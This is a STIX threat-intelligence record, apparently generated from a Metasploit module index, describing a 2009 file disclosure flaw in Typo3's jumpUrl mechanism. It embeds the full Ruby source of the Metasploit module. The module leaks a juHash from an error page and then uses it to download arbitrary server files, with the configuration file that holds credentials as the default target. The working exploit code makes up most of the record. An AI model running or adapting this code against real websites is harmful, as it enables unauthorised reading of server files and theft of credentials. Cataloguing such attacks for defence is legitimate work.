{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9459705f-67b4-4d5e-9566-b03f54e29a8c",
    "created": "2024-08-14T16:23:42.400182Z",
    "modified": "2024-08-14T16:23:42.400186Z",
    "name": "Typo3 sa-2009-002 File Disclosure",
    "description": " This module exploits a file disclosure vulnerability in the jumpUrl mechanism of Typo3. This flaw can be used to read any file that the web server user account has access to. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/typo3_sa_2009_002.rb",
            "external_id": "typo3_sa_2009_002.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0815"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20090212165636/http://secunia.com:80/advisories/33829/"
        },
        {
            "source_name": "reference",
            "url": "http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-002/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Typo3 sa-2009-002 File Disclosure',\n        'Description' => %q{\n          This module exploits a file disclosure vulnerability in the jumpUrl mechanism of\n          Typo3. This flaw can be used to read any file that the web server user account has\n          access to.\n        },\n        'Author' => [ 'spinbad <spinbad.security[at]googlemail.com>' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['OSVDB', '52048'],\n          ['CVE', '2009-0815'],\n          ['URL', 'http://web.archive.org/web/20090212165636/http://secunia.com:80/advisories/33829/'],\n          ['EDB', '8038'],\n          ['URL', 'http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-002/'],\n        ],\n        'DisclosureDate' => '2009-02-10',\n        'Actions' => [\n          ['Download', { 'Description' => 'Download arbitrary file' }]\n        ],\n        'DefaultAction' => 'Download'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('URI', [true, 'Typo3 Path', '/']),\n        OptString.new('RFILE', [true, 'The remote file to download', 'typo3conf/localconf.php']),\n        OptString.new('LFILE', [true, 'The local filename to store the data', 'localconf.php']),\n      ]\n    )\n  end\n\n  def run\n    print_status('Establishing a connection to the target...')\n\n    error_uri = datastore['URI'] + '/index.php?jumpurl=' + datastore['RFILE'] + '&juSecure=1&type=0&locationData=1:'\n    ju_hash = nil\n\n    res = send_request_raw({\n      'uri' => error_uri,\n      'method' => 'GET',\n      'headers' =>\n      {\n        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n        'Connection' => 'Close'\n      }\n    }, 25)\n\n    if (res && (res.message == 'OK'))\n      res.body =~ /jumpurl Secure: Calculated juHash, ((\\w)+), did not match the submitted juHash./\n\n      if ::Regexp.last_match(1).nil?\n        print_error('Error while getting juHash. Maybe the version is already patched...')\n        return\n      end\n\n      ju_hash = ::Regexp.last_match(1)\n      print_status(\"Getting juHash from error message: #{ju_hash}\")\n\n    else\n      print_error('No response from the server.')\n      return\n    end\n\n    file_uri = datastore['URI'] + '/index.php?jumpurl=' + datastore['RFILE'] + \"&juSecure=1&type=0&juHash=#{ju_hash}&locationData=1:\"\n    print_status(\"Trying to get #{datastore['RFILE']}.\")\n\n    file = send_request_raw({\n      'uri' => file_uri,\n      'method' => 'GET',\n      'headers' =>\n      {\n        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n        'Connection' => 'Close'\n      }\n    }, 25)\n\n    if (file && ((file.message = 'OK')))\n      if file.body == 'jumpurl Secure: \"' + datastore['RFILE'] + '\" was not a valid file!'\n        print_error(\"File #{datastore['RFILE']} does not exist.\")\n        return\n      end\n\n      print_status(\"Writing local file #{datastore['LFILE']}.\")\n      open(datastore['LFILE'], 'w') { |f| f << file.body }\n    else\n      print_error('Error while getting file.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-02-10"
}